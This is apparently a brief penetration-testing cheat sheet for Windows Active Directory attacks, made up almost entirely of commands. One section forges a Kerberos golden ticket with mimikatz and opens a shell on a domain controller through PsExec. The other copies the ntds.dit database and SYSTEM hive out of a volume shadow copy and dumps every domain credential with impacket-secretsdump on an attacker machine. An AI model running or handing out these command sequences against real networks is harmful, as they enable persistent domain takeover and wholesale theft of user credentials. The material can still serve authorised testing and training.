# Golden Ticket

```
# In mimikatz
kerberos::purge

kerberos::golden /user:<current domain user> /domain:corp.com /sid:<domain SID> /krbtgt:<krbtgt ntlm hash> /ptt

misc::cmd

# In cmd
PsExec.exe \\DC1 cmd.exe
```

# Shadow Copy

```
# In cmd

vshadow.exe -nw -p C:

copy \\?\GLOBALROOT.... <full path of shadow copy>\windows\ntds\ntds.dit C:\ntds.dit.bak

reg.exe save hklm\system C:\system.bak

# Then move them to kali attacker

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```